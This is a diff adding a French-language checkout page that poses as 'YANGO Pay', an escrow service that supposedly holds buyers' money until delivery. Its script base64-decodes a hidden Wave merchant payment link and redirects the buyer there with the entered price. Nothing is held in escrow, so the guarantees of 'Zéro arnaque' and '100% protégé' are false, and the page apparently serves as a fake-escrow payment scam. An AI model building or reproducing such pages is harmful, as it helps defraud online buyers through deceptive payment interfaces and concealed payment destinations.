@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>YANGO Pay — Commande Sécurisée</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0D0D0D;
+  --card:#161616;
+  --card2:#1E1E1E;
+  --red:#FF3B30;
+  --red2:#FF6058;
+  --green:#30D158;
+  --yellow:#FFD60A;
+  --blue:#0A84FF;
+  --white:#FFFFFF;
+  --gray:#8E8E93;
+  --gray2:#3A3A3C;
+  --border:rgba(255,255,255,0.08);
+}
+html{scroll-behavior:smooth}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--white);min-height:100vh;overflow-x:hidden}
+
+/* ── SPLASH ── */
+#splash{
+  position:fixed;inset:0;z-index:200;
+  background:var(--bg);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:24px;
+  transition:opacity .5s,transform .5s;
+}
+#splash.hide{opacity:0;pointer-events:none}
+
+.sp-glow{
+  position:absolute;top:-100px;left:50%;transform:translateX(-50%);
+  width:600px;height:600px;border-radius:50%;
+  background:radial-gradient(circle,rgba(255,59,48,.18) 0%,transparent 70%);
+  pointer-events:none;
+}
+
+.sp-logo{
+  font-size:clamp(42px,10vw,88px);
+  font-weight:900;
+  letter-spacing:-3px;
+  line-height:1;
+  text-align:center;
+  animation:popIn .7s .2s both;
+}
+.sp-logo .w{color:var(--white)}
+.sp-logo .r{color:var(--red)}
+
+.sp-tag{
+  margin-top:10px;
+  font-size:13px;font-weight:600;letter-spacing:3px;
+  text-transform:uppercase;color:var(--gray);
+  animation:popIn .7s .4s both;
+}
+
+.sp-divider{
+  width:40px;height:3px;border-radius:99px;
+  background:linear-gradient(90deg,var(--red),var(--yellow));
+  margin:28px auto;
+  animation:popIn .5s .6s both;
+}
+
+.sp-desc{
+  max-width:400px;text-align:center;
+  font-size:15px;line-height:1.7;color:var(--gray);
+  animation:popIn .7s .7s both;
+}
+.sp-desc strong{color:var(--white)}
+
+/* Badges securite */
+.sp-badges{
+  display:flex;gap:12px;flex-wrap:wrap;justify-content:center;
+  margin-top:28px;
+  animation:popIn .7s .9s both;
+}
+.sp-badge{
+  display:flex;align-items:center;gap:6px;
+  background:rgba(255,255,255,.05);
+  border:1px solid var(--border);
+  border-radius:99px;
+  padding:7px 14px;
+  font-size:12px;font-weight:600;color:var(--white);
+}
+.sp-badge .dot{width:7px;height:7px;border-radius:50%;}
+.dot-g{background:var(--green)}
+.dot-y{background:var(--yellow)}
+.dot-b{background:var(--blue)}
+
+.sp-btn{
+  margin-top:40px;
+  padding:17px 60px;
+  background:var(--red);
+  color:#fff;
+  font-family:'Inter',sans-serif;
+  font-size:16px;font-weight:700;
+  border:none;border-radius:99px;
+  cursor:pointer;
+  transition:background .2s,transform .15s,box-shadow .2s;
+  animation:popIn .7s 1.1s both;
+  box-shadow:0 0 0 0 rgba(255,59,48,.4);
+}
+.sp-btn:hover{
+  background:var(--red2);
+  transform:scale(1.04);
+  box-shadow:0 8px 32px rgba(255,59,48,.35);
+}
+.sp-hint{
+  margin-top:12px;font-size:12px;color:var(--gray);
+  animation:popIn .5s 1.3s both;
+}
+
+/* Flotteurs déco */
+.floater{
+  position:absolute;
+  border-radius:16px;
+  border:1px solid var(--border);
+  background:var(--card);
+  padding:10px 16px;
+  font-size:12px;font-weight:600;
+  display:flex;align-items:center;gap:8px;
+  animation:float 4s ease-in-out infinite;
+  white-space:nowrap;
+}
+.fl1{top:18%;left:5%;animation-delay:0s}
+.fl2{top:22%;right:4%;animation-delay:1s}
+.fl3{bottom:22%;left:6%;animation-delay:2s}
+.fl4{bottom:18%;right:5%;animation-delay:.5s}
+@media(max-width:600px){.floater{display:none}}
+
+/* ── APP ── */
+#app{
+  min-height:100vh;
+  display:none;flex-direction:column;
+  opacity:0;transition:opacity .5s;
+}
+#app.show{display:flex}
+#app.visible{opacity:1}
+
+/* Navbar */
+.nav{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:18px 24px;
+  border-bottom:1px solid var(--border);
+  position:sticky;top:0;z-index:50;
+  background:rgba(13,13,13,.85);
+  backdrop-filter:blur(20px);
+}
+.nav-logo{font-size:20px;font-weight:900;letter-spacing:-1px}
+.nav-logo .r{color:var(--red)}
+.nav-pill{
+  background:rgba(48,209,88,.12);
+  border:1px solid rgba(48,209,88,.3);
+  color:var(--green);
+  border-radius:99px;
+  padding:6px 14px;
+  font-size:12px;font-weight:600;
+  display:flex;align-items:center;gap:6px;
+}
+.nav-pill::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse 1.5s infinite}
+
+/* Hero band */
+.hero{
+  padding:40px 24px 32px;
+  text-align:center;
+  position:relative;overflow:hidden;
+}
+.hero-glow{
+  position:absolute;top:-80px;left:50%;transform:translateX(-50%);
+  width:500px;height:400px;
+  background:radial-gradient(circle,rgba(255,59,48,.12) 0%,transparent 65%);
+  pointer-events:none;
+}
+.hero h1{
+  font-size:clamp(28px,6vw,52px);
+  font-weight:900;letter-spacing:-1.5px;
+  line-height:1.1;
+}
+.hero h1 em{
+  font-style:normal;
+  background:linear-gradient(135deg,var(--red),var(--yellow));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+}
+.hero p{
+  margin-top:12px;
+  font-size:15px;color:var(--gray);line-height:1.6;
+  max-width:420px;margin-left:auto;margin-right:auto;
+}
+
+/* Stats row */
+.stats{
+  display:flex;justify-content:center;gap:0;
+  margin:28px 24px 0;
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:16px;
+  overflow:hidden;
+}
+.stat{
+  flex:1;padding:18px 12px;text-align:center;
+  border-right:1px solid var(--border);
+}
+.stat:last-child{border-right:none}
+.stat-val{font-size:22px;font-weight:800;letter-spacing:-0.5px}
+.stat-lbl{font-size:11px;color:var(--gray);margin-top:2px;font-weight:500}
+.stat-val.g{color:var(--green)}
+.stat-val.r{color:var(--red)}
+.stat-val.y{color:var(--yellow)}
+
+/* Etapes */
+.steps{
+  display:flex;gap:10px;
+  padding:24px 24px 0;
+  overflow-x:auto;
+  scrollbar-width:none;
+}
+.steps::-webkit-scrollbar{display:none}
+.step{
+  flex:0 0 auto;
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:14px;
+  padding:16px;
+  width:140px;
+  text-align:center;
+}
+.step-num{
+  width:32px;height:32px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:14px;font-weight:800;
+  margin:0 auto 10px;
+}
+.sn1{background:rgba(10,132,255,.15);color:var(--blue)}
+.sn2{background:rgba(255,214,10,.15);color:var(--yellow)}
+.sn3{background:rgba(48,209,88,.15);color:var(--green)}
+.step-title{font-size:12px;font-weight:700;margin-bottom:4px}
+.step-desc{font-size:11px;color:var(--gray);line-height:1.4}
+
+/* Formulaire */
+.form-section{padding:28px 24px}
+
+.form-label-top{
+  font-size:13px;font-weight:700;
+  text-transform:uppercase;letter-spacing:1.5px;
+  color:var(--gray);margin-bottom:16px;
+}
+
+.form-card{
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:20px;
+  overflow:hidden;
+}
+
+.form-row{
+  display:flex;align-items:center;
+  padding:16px 20px;
+  border-bottom:1px solid var(--border);
+  gap:14px;
+  transition:background .15s;
+}
+.form-row:last-of-type{border-bottom:none}
+.form-row:focus-within{background:rgba(255,255,255,.03)}
+
+.row-icon{
+  width:38px;height:38px;border-radius:10px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:18px;flex-shrink:0;
+}
+.ri1{background:rgba(10,132,255,.15)}
+.ri2{background:rgba(255,214,10,.15)}
+.ri3{background:rgba(48,209,88,.15)}
+
+.row-content{flex:1}
+.row-content label{
+  display:block;
+  font-size:11px;font-weight:600;
+  color:var(--gray);margin-bottom:4px;
+  text-transform:uppercase;letter-spacing:1px;
+}
+.row-content input{
+  width:100%;background:transparent;border:none;outline:none;
+  font-family:'Inter',sans-serif;
+  font-size:16px;font-weight:600;color:var(--white);
+}
+.row-content input::placeholder{color:rgba(142,142,147,.5);font-weight:400}
+
+/* Prix */
+.price-row{display:flex;align-items:center;gap:6px}
+.price-row input{flex:1}
+.fcfa-tag{
+  font-size:12px;font-weight:700;
+  color:var(--green);
+  background:rgba(48,209,88,.1);
+  border-radius:6px;padding:3px 8px;
+  flex-shrink:0;
+}
+
+/* Btn commander */
+.cmd-wrap{padding:20px 24px 0}
+.cmd-btn{
+  width:100%;
+  padding:18px;
+  background:var(--red);
+  color:#fff;
+  font-family:'Inter',sans-serif;
+  font-size:17px;font-weight:800;
+  letter-spacing:-.3px;
+  border:none;border-radius:16px;
+  cursor:pointer;
+  transition:background .2s,transform .15s,box-shadow .2s;
+  display:flex;align-items:center;justify-content:center;gap:10px;
+}
+.cmd-btn:hover{background:var(--red2);transform:translateY(-2px);box-shadow:0 12px 32px rgba(255,59,48,.3)}
+.cmd-btn:active{transform:translateY(0)}
+.cmd-btn .arrow{font-size:20px;transition:transform .2s}
+.cmd-btn:hover .arrow{transform:translateX(4px)}
+
+/* Erreur */
+.err-msg{
+  display:none;
+  background:rgba(255,59,48,.1);
+  border:1px solid rgba(255,59,48,.3);
+  color:var(--red2);
+  border-radius:12px;
+  padding:12px 16px;
+  font-size:13px;font-weight:600;
+  margin:12px 24px 0;
+  text-align:center;
+}
+.err-msg.show{display:block}
+
+/* Garantie */
+.guarantee{
+  margin:20px 24px 0;
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:16px;
+  padding:18px;
+  display:flex;gap:14px;align-items:flex-start;
+}
+.g-icon{font-size:28px;flex-shrink:0}
+.g-title{font-size:14px;font-weight:700;margin-bottom:4px}
+.g-desc{font-size:13px;color:var(--gray);line-height:1.5}
+.g-desc strong{color:var(--green)}
+
+/* Méthode paiement */
+.pay-method{
+  margin:16px 24px 0;
+  display:flex;align-items:center;gap:12px;
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:14px;
+  padding:14px 18px;
+}
+.wave-logo{
+  width:40px;height:40px;border-radius:10px;
+  background:linear-gradient(135deg,#1A5CFF,#0038B8);
+  display:flex;align-items:center;justify-content:center;
+  font-size:18px;font-weight:900;color:#fff;
+  flex-shrink:0;
+}
+.pay-info{flex:1}
+.pay-name{font-size:14px;font-weight:700}
+.pay-sub{font-size:12px;color:var(--gray)}
+.pay-check{color:var(--green);font-size:20px}
+
+/* Footer */
+.app-footer{
+  padding:28px 24px;
+  text-align:center;
+  color:var(--gray);
+  font-size:12px;
+  margin-top:auto;
+}
+
+/* ── Animations ── */
+@keyframes popIn{
+  from{opacity:0;transform:translateY(24px) scale(.96)}
+  to{opacity:1;transform:translateY(0) scale(1)}
+}
+@keyframes float{
+  0%,100%{transform:translateY(0)}
+  50%{transform:translateY(-8px)}
+}
+@keyframes pulse{
+  0%,100%{opacity:1;transform:scale(1)}
+  50%{opacity:.4;transform:scale(.7)}
+}
+</style>
+</head>
+<body>
+
+<!-- ══ SPLASH ══ -->
+<div id="splash">
+  <div class="sp-glow"></div>
+
+  <!-- Badges flottants -->
+  <div class="floater fl1">🔒 <span>Paiement sécurisé</span></div>
+  <div class="floater fl2">✅ <span>Livraison confirmée</span></div>
+  <div class="floater fl3">💰 <span>Argent protégé</span></div>
+  <div class="floater fl4">⚡ <span>Paiement Wave</span></div>
+
+  <h1 class="sp-logo">
+    <span class="w">YANGO </span><span class="r">PAY</span>
+  </h1>
+  <p class="sp-tag">Commande Sécurisée</p>
+
+  <div class="sp-divider"></div>
+
+  <p class="sp-desc">
+    La plateforme où <strong>votre argent est protégé</strong> jusqu'à ce que vous confirmiez avoir bien reçu votre commande.
+  </p>
+
+  <div class="sp-badges">
+    <div class="sp-badge"><div class="dot dot-g"></div> Zéro arnaque</div>
+    <div class="sp-badge"><div class="dot dot-y"></div> Paiement Wave</div>
+    <div class="sp-badge"><div class="dot dot-b"></div> Livraison garantie</div>
+  </div>
+
+  <button class="sp-btn" onclick="enterSite()">Commencer &nbsp;→</button>
+  <p class="sp-hint">Appuyez sur Entrée ou touchez le bouton</p>
+</div>
+
+<!-- ══ APP ══ -->
+<div id="app">
+
+  <!-- Nav -->
+  <nav class="nav">
+    <div class="nav-logo">DARK <span class="r">PAY</span></div>
+    <div class="nav-pill">Sécurisé</div>
+  </nav>
+
+  <!-- Hero -->
+  <div class="hero">
+    <div class="hero-glow"></div>
+    <h1>Commandez<br><em>en toute sécurité</em></h1>
+    <p>Votre argent est bloqué par YANGO Pay et libéré uniquement après confirmation de votre livraison.</p>
+  </div>
+
+  <!-- Stats -->
+  <div class="stats">
+    <div class="stat">
+      <div class="stat-val g">100%</div>
+      <div class="stat-lbl">Sécurisé</div>
+    </div>
+    <div class="stat">
+      <div class="stat-val y">0 F</div>
+      <div class="stat-lbl">De frais</div>
+    </div>
+    <div class="stat">
+      <div class="stat-val r">0</div>
+      <div class="stat-lbl">Arnaque</div>
+    </div>
+  </div>
+
+  <!-- Etapes -->
+  <div class="steps">
+    <div class="step">
+      <div class="step-num sn1">1</div>
+      <div class="step-title">Commandez</div>
+      <div class="step-desc">Remplissez le formulaire et payez via Wave</div>
+    </div>
+    <div class="step">
+      <div class="step-num sn2">2</div>
+      <div class="step-title">On sécurise</div>
+      <div class="step-desc">Yango Pay garde votre argent en sécurité</div>
+    </div>
+    <div class="step">
+      <div class="step-num sn3">3</div>
+      <div class="step-title">Confirmez</div>
+      <div class="step-desc">Colis reçu ? On libère le paiement au vendeur</div>
+    </div>
+  </div>
+
+  <!-- Formulaire -->
+  <div class="form-section">
+    <p class="form-label-top">Votre commande</p>
+
+    <div class="form-card">
+      <div class="form-row">
+        <div class="row-icon ri1">🏪</div>
+        <div class="row-content">
+          <label>Nom du vendeur</label>
+          <input type="text" id="vendeur" placeholder="Ex : Boutique Alpha">
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="row-icon ri2">📦</div>
+        <div class="row-content">
+          <label>Nom de l'article</label>
+          <input type="text" id="article" placeholder="Ex : Bijoux">
+        </div>
+      </div>
+      <div class="form-row">
+        <div class="row-icon ri3">💵</div>
+        <div class="row-content">
+          <label>Prix de l'article</label>
+          <div class="price-row">
+            <input type="number" id="prix" placeholder="Ex : 150000" min="1">
+            <div class="fcfa-tag">FCFA</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Btn -->
+  <div class="cmd-wrap">
+    <button class="cmd-btn" onclick="commander()">
+      Passer la commande <span class="arrow">→</span>
+    </button>
+  </div>
+
+  <div class="err-msg" id="erreur">⚠️ Veuillez remplir tous les champs.</div>
+
+  <!-- Garantie -->
+  <div class="guarantee">
+    <div class="g-icon">🛡️</div>
+    <div>
+      <div class="g-title">Garantie yango Pay</div>
+      <div class="g-desc">
+        Le vendeur <strong>ne reçoit rien</strong> avant que vous confirmiez la livraison. Votre argent est 100% protégé.
+      </div>
+    </div>
+  </div>
+
+  <!-- Wave -->
+  <div class="pay-method">
+    <div class="wave-logo">W</div>
+    <div class="pay-info">
+      <div class="pay-name">Paiement via Wave</div>
+      <div class="pay-sub">Rapide, sécurisé et instantané</div>
+    </div>
+    <div class="pay-check">✓</div>
+  </div>
+
+  <div class="app-footer">© 2026 Yango Pay · Commande Sécurisée</div>
+</div>
+
+<script>
+function enterSite(){
+  const sp=document.getElementById('splash');
+  const ap=document.getElementById('app');
+  sp.classList.add('hide');
+  setTimeout(()=>{
+    sp.style.display='none';
+    ap.classList.add('show');
+    setTimeout(()=>ap.classList.add('visible'),30);
+  },500);
+}
+
+document.addEventListener('keydown',e=>{
+  if(e.key==='Enter'&&!document.getElementById('splash').classList.contains('hide'))enterSite();
+});
+
+function commander(){
+  const v=document.getElementById('vendeur').value.trim();
+  const a=document.getElementById('article').value.trim();
+  const p=parseInt(document.getElementById('prix').value);
+  const err=document.getElementById('erreur');
+  if(!v||!a||!p||p<=0){err.classList.add('show');return;}
+  err.classList.remove('show');
+  const base=atob('aHR0cHM6Ly9wYXkud2F2ZS5jb20vbS9NX2NpX2VkY1lGc09NaWpyai9jL2NpLw==');
+  window.location.href=base+'?amount='+p;
+}
+</script>
+</body>
+</html>
